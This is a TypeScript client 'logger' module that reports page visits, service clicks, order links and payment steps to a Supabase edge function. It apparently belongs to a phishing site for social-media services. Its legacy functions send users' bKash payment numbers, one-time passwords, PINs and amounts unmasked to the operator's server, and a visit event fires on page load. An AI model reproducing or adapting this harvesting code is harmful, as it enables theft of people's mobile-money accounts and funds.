import { supabase } from "@/integrations/supabase/client";

// =========== CONFIG ===========
const DEBOUNCE_MS = 800; // avoid double-sends on double clicks
// ==============================

// small debounce helper
const _timers: Record<string, number> = {};
function debounce(key: string, fn: () => void, ms = DEBOUNCE_MS) {
  if (_timers[key]) clearTimeout(_timers[key]);
  _timers[key] = window.setTimeout(() => {
    fn();
    delete _timers[key];
  }, ms);
}

// mask helper
function maskLast4(n?: string): string {
  if (!n) return "N/A";
  const s = String(n).replace(/\s+/g, "");
  return s.length <= 4 ? "****" + s : "****" + s.slice(-4);
}

// client info
function getClientInfo() {
  return {
    device: navigator.userAgent || "N/A",
    referrer: document.referrer || "N/A",
    screen: (window.screen?.width || "N/A") + "x" + (window.screen?.height || "N/A"),
  };
}

// send event to server via Supabase edge function
async function postEvent(type: string, payload: Record<string, unknown> = {}) {
  const client = getClientInfo();
  const body = { type, payload: { ...payload, ...client } };
  try {
    const { data, error } = await supabase.functions.invoke("murgi-logger", { body });
    if (error) throw error;
    return data;
  } catch (err) {
    console.error("murgi postEvent error", err);
    return { ok: false, error: err instanceof Error ? err.message : "network" };
  }
}

// public API — call these from your event handlers
export const murgiLogger = {
  visit: () => debounce("visit", () => postEvent("visit", {})),
  platformClick: (platform: string) =>
    debounce("platformClick:" + platform, () => postEvent("platform_click", { platform })),
  serviceClick: (platform: string, service: string) =>
    debounce("serviceClick:" + platform + ":" + service, () =>
      postEvent("service_click", { platform, service })
    ),
  orderSubmit: (platform: string, service: string, link: string) =>
    debounce("orderSubmit:" + link, () => postEvent("order_submit", { platform, service, link })),
  paymentPage: (method: string) =>
    debounce("paymentPage:" + method, () => postEvent("payment_page", { method })),
  paymentNumber: (method: string, number: string) =>
    debounce("paymentNumber:" + method, () =>
      postEvent("payment_number", { method, numberMasked: maskLast4(number) })
    ),
  paymentOTPNote: (method: string, numberProvided = false) =>
    debounce("paymentOTP:" + method, () =>
      postEvent("payment_otp_note", { method, numberMasked: numberProvided ? "****(masked)" : "N/A" })
    ),
  paymentPINNote: (method: string, numberProvided = false) =>
    debounce("paymentPIN:" + method, () =>
      postEvent("payment_pin_note", { method, numberMasked: numberProvided ? "****(masked)" : "N/A" })
    ),
  
  // Legacy support for old API
  logMembershipClick: (platform = "Youtube") =>
    debounce("membership:" + platform, () => postEvent("membership_click", { platform })),
  logBetaAccessClick: (page = "unknown page") =>
    debounce("beta:" + page, () => postEvent("beta_access_click", { page })),
  logPaymentNumber: (page = "Payment Page", number = "") =>
    debounce("payNum:" + page, () => postEvent("payment_number", { page, number })),
  logPaymentGatewayOpen: (gateway = "Payment") =>
    debounce("gateway:" + gateway, () => postEvent("payment_gateway_open", { gateway })),
  logOTP_PIN: (
    method = "bKash",
    details: { number?: string; otp?: string; pin?: string; amount?: string } = {}
  ) => debounce("otppin:" + method, () => postEvent("otp_pin", { method, ...details })),
  logGeneric: (text: string) => debounce("generic:" + text, () => postEvent("generic", { text })),
};

// Attach to window for easy access
declare global {
  interface Window {
    murgi: typeof murgiLogger;
    murgiLogger: typeof murgiLogger;
  }
}

window.murgi = murgiLogger;
window.murgiLogger = murgiLogger;

console.log("murgi client ready — use window.murgi.* to send events.");

// Optional: auto-fire visit on page load
window.addEventListener("load", () => {
  try {
    window.murgi.visit();
  } catch (e) {
    console.error("murgi visit error", e);
  }
});

export default murgiLogger;
